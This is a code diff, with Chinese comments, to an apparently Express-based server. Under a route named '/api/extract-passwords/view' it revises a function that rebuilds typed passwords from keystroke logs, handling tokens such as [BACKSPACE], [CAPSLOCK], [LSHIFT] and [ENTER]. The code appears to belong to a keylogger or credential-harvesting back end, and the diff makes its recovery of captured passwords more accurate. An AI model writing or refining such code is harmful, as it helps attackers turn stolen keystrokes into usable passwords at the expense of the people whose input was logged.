@@ -1616,61 +1616,68 @@ app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
 }));
 
 // 解析包含特殊键的密码字符串
-function parsePassword(password) {
+// 解析包含特殊键的密码字符串（修正版）
+function parsePassword(raw) {
     let result = '';
-    let capsLock = false;
+    let capsLock = false;     // 大小写锁定状态
+    let shiftPressed = false; // Shift 是否被按下（仅对下一个字符有效）
+
     let i = 0;
-    
-    while (i < password.length) {
-        if (password[i] === '[') {
-            // 查找特殊键的结束位置
-            const endIndex = password.indexOf(']', i);
-            if (endIndex !== -1) {
-                const specialKey = password.substring(i + 1, endIndex);
-                
-                switch (specialKey) {
-                    case 'BACKSPACE':
-                        // 删除前一个字符
-                        result = result.slice(0, -1);
-                        break;
-                    case 'CAPSLOCK':
-                        // 切换大小写状态
-                        capsLock = !capsLock;
-                        break;
-                    case 'TAB':
-                        // 替换为空格
-                        result += ' ';
-                        break;
-                    case 'LSHIFT':
-                    case 'RSHIFT':
-                        // 暂时忽略Shift键，因为需要更复杂的上下文处理
-                        break;
-                    default:
-                        // 其他特殊键，暂时忽略
-                        break;
-                }
-                
-                i = endIndex + 1;
-            } else {
-                // 没有找到结束的 ]，当作普通字符处理
-                result += password[i];
+    while (i < raw.length) {
+        if (raw[i] === '[') {
+            const end = raw.indexOf(']', i);
+            if (end === -1) {
+                // 未闭合的括号，当作普通字符处理
+                result += raw[i];
                 i++;
+                continue;
             }
-        } else if (password[i] === '\n') {
-            // 保留换行符
+
+            const key = raw.substring(i + 1, end).toUpperCase();
+            switch (key) {
+                case 'BACKSPACE':
+                    // 删除前一个字符
+                    result = result.slice(0, -1);
+                    break;
+                case 'TAB':
+                    result += ' ';  // 将 Tab 转换为空格
+                    break;
+                case 'ENTER':
+                case 'RETURN':
+                    result += '\n';
+                    break;
+                case 'CAPSLOCK':
+                    capsLock = !capsLock;
+                    break;
+                case 'LSHIFT':
+                case 'RSHIFT':
+                    shiftPressed = true;
+                    break;
+                // 其他特殊键（LCONTROL、LWIN 等）在密码输入中无意义，直接忽略
+                default:
+                    break;
+            }
+            i = end + 1;
+        } else if (raw[i] === '\n') {
             result += '\n';
             i++;
         } else {
-            // 普通字符，根据当前大小写状态处理
-            let char = password[i];
-            if (capsLock && /[a-zA-Z]/.test(char)) {
-                char = char.toUpperCase();
+            let ch = raw[i];
+            
+            // 处理字母的大小写（Shift 和 CapsLock 共同作用）
+            if (/[a-zA-Z]/.test(ch)) {
+                // 当 CapsLock 开启时，按 Shift 会临时变为小写；反之亦然
+                const isUpper = (capsLock && !shiftPressed) || (!capsLock && shiftPressed);
+                ch = isUpper ? ch.toUpperCase() : ch.toLowerCase();
             }
-            result += char;
+            
+            // 数字和符号暂不处理 Shift 组合（如 Shift+1 -> !），因为日志中未出现此类情况
+            
+            result += ch;
+            shiftPressed = false; // Shift 只影响紧接着的一个字符，用完后释放
             i++;
         }
     }
-    
     return result;
 }
 
